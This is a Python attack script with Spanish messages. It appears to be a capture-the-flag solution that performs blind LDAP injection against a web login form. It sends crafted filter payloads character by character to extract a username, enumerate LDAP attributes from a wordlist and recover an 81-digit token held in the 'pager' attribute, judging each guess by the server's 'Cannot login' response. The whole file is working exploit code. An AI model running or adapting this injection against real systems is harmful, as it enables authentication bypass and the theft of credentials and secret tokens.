#!/usr/bin/python3
import requests, signal,sys
from argparse import ArgumentParser
from urllib.parse import quote
from time import sleep
import string
from pwn import *

def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def brute_force_username(ip):
    url = "http://{}/login.php".format(ip)
    chars = string.ascii_lowercase
    username = []
    
    progress_pass = log.progress("[+] Buscando usuario --> ")
    with requests.Session() as s:
        while True:
            for i in chars:
                try:
                    payload = '*)(uid={}*'.format(''.join(username) + i)
                    encoded_payload = quote(payload, safe='')
                    data = {
                        'inputUsername': encoded_payload,
                        'inputOTP': '1234'
                    }
                    r = s.post(url, data=data)
                    r.raise_for_status()
                    if 'Cannot login' in r.text:
                        username.append(i)
                        progress_pass.status(''.join(username))
                        break
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                    continue
            
def brute_force_attribute(ip):
    url = "http://{}/login.php".format(ip)
    chars = string.ascii_lowercase
    username = []
    try:
        with open('LDAP_attributes.txt', 'r') as file:
            attrs = file.read().splitlines()
    except FileNotFoundError:
        print("[!] Error: No se encontró el archivo 'LDAP_attributes.txt'")
        sys.exit(1)
    except PermissionError:
        print("[!] Error: No tienes permiso para leer el archivo 'LDAP_attributes.txt'")
        sys.exit(1)
    except OSError as file_err:
        print(f"Error al leer el archivo: {file_err}")
    
    with requests.Session() as s:
        for i in attrs:
            try:
                payload = 'ldapuser)({}=*'.format(i)
                encoded_payload = quote(payload, safe='')
                data = {
                    'inputUsername': encoded_payload,
                    'inputOTP': '1234'
                }
                r = s.post(url, data=data)
                r.raise_for_status()
                if b'Cannot login' in r.content:
                    print ("Attribute found " + i)
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
                continue

def brute_force_token(ip):
    url = "http://{}/login.php".format(ip)
    chars = string.digits
    token = []
    size = 81
    
    progress_pass = log.progress("[+] Buscando token --> ")
    with requests.Session() as s:
        while size > 0: 
            for i in chars:
                try:
                    payload = 'ldapuser)(pager={}*'.format(''.join(token) + i)
                    encoded_payload = quote(payload, safe='')
                    
                    sleep(1)
                    data = {
                        'inputUsername': encoded_payload,
                        'inputOTP': '1234'
                    }
                    r = s.post(url, data=data)
                    r.raise_for_status()
                    if b'Cannot login' in r.content:
                        token.append(i)
                        size = size - 1
                        progress_pass.status("Token: " + ''.join(token))
                        break
                except requests.exceptions.RequestException as e:
                    print(f"Error: {e}")
                    continue
    
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="direccion ip", required=True)
    args = parser.parse_args()
    
    brute_force_token(args.ip)
